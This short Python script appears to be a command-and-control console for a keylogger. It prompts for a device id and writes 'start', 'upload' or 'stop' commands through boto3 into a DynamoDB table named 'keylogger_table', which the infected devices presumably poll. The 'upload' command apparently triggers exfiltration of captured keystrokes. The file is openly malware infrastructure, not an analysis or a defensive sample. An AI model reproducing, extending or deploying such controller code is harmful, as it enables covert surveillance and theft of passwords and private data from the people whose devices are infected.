import boto3


def main():
    device_id = input("Device id: ")

    while True:
        cmd = input("Enter cmd: Start | Upload | Stop").strip().lower()
        
        if cmd == "start":
            update_cmd(device_id, cmd)
        elif cmd == "upload":
            update_cmd(device_id, cmd)
        elif cmd == "stop":
            update_cmd(device_id, cmd)
        else:
            break


def update_cmd(device_id, cmd):
    dynamodb = boto3.client('dynamodb', region_name='ap-southeast-2')
    dynamodb.update_item(
        TableName='keylogger_table',
        Key={'device_id': {'S': device_id}},
        UpdateExpression='SET last_command = :cmd',
        ExpressionAttributeValues={':cmd': {'S': cmd}}
)
    
if __name__ == "__main__":
    main()